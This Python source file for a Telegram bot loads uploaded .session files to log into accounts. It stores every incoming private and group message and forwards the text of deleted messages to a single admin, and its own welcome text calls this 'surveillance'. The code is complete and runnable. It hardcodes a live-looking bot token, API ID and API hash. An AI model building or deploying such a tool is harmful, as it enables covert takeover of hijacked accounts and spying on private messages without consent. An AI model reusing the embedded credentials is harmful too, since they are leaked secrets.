import asyncio
import logging
import sqlite3
import os
import glob
from telethon import TelegramClient, events, Button

# Импортируем веб-сервер для Render
from fastapi import FastAPI
import uvicorn

# --- ТВОИ ДАННЫЕ ВШИТЫ НАПРЯМУЮ ---
BOT_TOKEN = "8947765577:AAFeZC4aE9J-KTTZ18yZffUWehUAEHWgYwo"
ADMIN_ID = 8669477816
API_ID = 39188918
API_HASH = "41aaeaa0c6f9a61c0504395ccf5f3b3c"

# --- НАСТРОЙКА БАЗЫ ДАННЫХ SQLITE (ДЛЯ КЭША СООБЩЕНИЙ) ---
logging.basicConfig(level=logging.INFO)
db = sqlite3.connect("bot_data.db", check_same_thread=False)
cursor = db.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS messages (acc_name TEXT, msg_id INTEGER, chat_id INTEGER, sender_name TEXT, text TEXT, PRIMARY KEY (acc_name, msg_id, chat_id))''')
db.commit()

bot = TelegramClient('main_bot_session', API_ID, API_HASH)
active_clients = {}  

# --- ВЕБ-ЗАГЛУШКА ДЛЯ RENDER ---
app = FastAPI()

@app.get("/")
def read_root():
    return {"status": "ok", "message": f"Бот-логер работает! Активных сессий: {len(active_clients)}"}

# --- ЛОГИКА ПЕРЕХВАТА И УДАЛЕНИЯ СООБЩЕНИЙ ---
def register_userbot_handlers(client, acc_name):
    @client.on(events.NewMessage(incoming=True))
    async def on_new_message(event):
        if not (event.is_private or event.is_group):
            return
        if not event.text:
            return
        sender = await event.get_sender()
        sender_name = f"@{sender.username}" if sender and getattr(sender, 'username', None) else f"{getattr(sender, 'first_name', '')} {getattr(sender, 'last_name', '')}".strip()
        if not sender_name:
            sender_name = f"ID: {event.sender_id}"
        cursor.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?, ?, ?)", (acc_name, event.id, event.chat_id, sender_name, event.text))
        db.commit()

    @client.on(events.MessageDeleted())
    async def on_message_deleted(event):
        for msg_id in event.deleted_ids:
            cursor.execute("SELECT sender_name, text FROM messages WHERE acc_name = ? AND msg_id = ?", (acc_name, msg_id))
            res = cursor.fetchone()
            if res:
                sender_name, text = res
                try:
                    chat = await client.get_entity(event.original_update.channel_id if hasattr(event.original_update, 'channel_id') else event.chat_id)
                    chat_title = getattr(chat, 'title', 'Личный чат')
                except:
                    chat_title = "Личный чат"

                report = (
                    f"🗑 <b>УДАЛЕНО СООБЩЕНИЕ!</b>\n\n"
                    f"📱 <b>Лог аккаунта:</b> {acc_name}\n"
                    f"👥 <b>Где:</b> {chat_title}\n"
                    f"👤 <b>От кого:</b> {sender_name}\n"
                    f"📝 <b>Текст:</b> {text}"
                )
                await bot.send_message(ADMIN_ID, report, parse_mode='html')
                cursor.execute("DELETE FROM messages WHERE acc_name = ? AND msg_id = ?", (acc_name, msg_id))
                db.commit()

async def start_all_session_files():
    """Запуск всех файлов .session, которые есть в папке"""
    session_files = glob.glob("*.session")
    for file_path in session_files:
        session_name = os.path.basename(file_path).replace(".session", "")
        if session_name == "main_bot_session" or session_name in active_clients:
            continue
            
        try:
            cl = TelegramClient(session_name, API_ID, API_HASH)
            await cl.connect()
            if await cl.is_user_authorized():
                active_clients[session_name] = cl
                register_userbot_handlers(cl, session_name)
                logging.info(f"💾 Файл сессии {session_name}.session запущен!")
            else:
                logging.warning(f"❌ Файл сессии {session_name}.session не авторизован.")
        except Exception as e:
            logging.error(f"⚠️ Ошибка запуска {session_name}.session: {e}")

# --- ИНТЕРФЕЙС УПРАВЛЕНИЯ БОТОМ ---

@bot.on(events.NewMessage(pattern='/start'))
async def send_welcome(event):
    if event.sender_id != ADMIN_ID:
        return
    buttons = [
        [Button.inline("📱 Список сессий", b"list_sessions")]
    ]
    await event.respond("👋 Привет! Я твой логер через загрузку <b>.session</b> файлов.\n\n"
                        "📂 <b>Как добавить аккаунт?</b>\n"
                        "Просто отправь мне файл сессии (документом) или ПЕРЕШЛИ его прямо в этот чат!\n"
                        "Я сам скачаю его и мгновенно запущу в слежку.", buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery())
async def callback_handler(event):
    if event.sender_id != ADMIN_ID:
        return
    if event.data == b"list_sessions":
        active_list = "\n".join([f"• <code>{name}.session</code>" for name in active_clients.keys()]) if active_clients else "Нет активных файлов сессий."
        await event.respond(f"🟩 <b>Сейчас работают сессии:</b>\n\n{active_list}", parse_mode='html')

# --- ИСПРАВЛЕННЫЙ ПРИЕМ ФАЙЛОВ .SESSION (ПРИНИМАЕТ И ПЕРЕСЛАННЫЕ) ---
@bot.on(events.NewMessage())
async def handle_document(event):
    # Проверяем, что сообщение прислал именно ты (неважно, переслано оно или нет)
    if event.sender_id != ADMIN_ID:
        return
        
    if not event.document:
        return
        
    # Ищем имя файла в атрибутах документа
    file_name = None
    for attr in event.document.attributes:
        if hasattr(attr, 'file_name'):
            file_name = attr.file_name
            break
            
    if not file_name or not file_name.endswith(".session"):
        return

    if file_name == "main_bot_session.session":
        await event.respond("❌ Файл не должен называться <code>main_bot_session.session</code>!", parse_mode='html')
        return

    status_msg = await event.respond(f"⏳ Скачиваю файл <code>{file_name}</code>...", parse_mode='html')
    
    try:
        path = await event.download_media(file=file_name)
        session_name = file_name.replace(".session", "")
        
        if session_name in active_clients:
            try:
                await active_clients[session_name].disconnect()
            except:
                pass
        
        cl = TelegramClient(session_name, API_ID, API_HASH)
        await cl.connect()
        
        if await cl.is_user_authorized():
            active_clients[session_name] = cl
            register_userbot_handlers(cl, session_name)
            await status_msg.edit(f"✅ <b>Файл {file_name} успешно принят и запущен в слежку!</b>", parse_mode='html')
        else:
            await status_msg.edit(f"❌ Ошибка: файл сессии <code>{file_name}</code> не авторизован или устарел.", parse_mode='html')
            if os.path.exists(path):
                os.remove(path)
                
    except Exception as e:
        await status_msg.edit(f"⚠️ Произошла ошибка при обработке файла: {e}")

async def start_tg_bot():
    await bot.start(bot_token=BOT_TOKEN)
    start_all_saved_accounts_task = asyncio.create_task(start_all_session_files())
    print("🤖 Системный бот запущен!")
    await bot.run_until_disconnected()

async def main():
    asyncio.create_task(start_tg_bot())
    config = uvicorn.Config(app, host="0.0.0.0", port=10000, log_level="info")
    server = uvicorn.Server(config)
    await server.serve()

if __name__ == '__main__':
    asyncio.run(main())
            
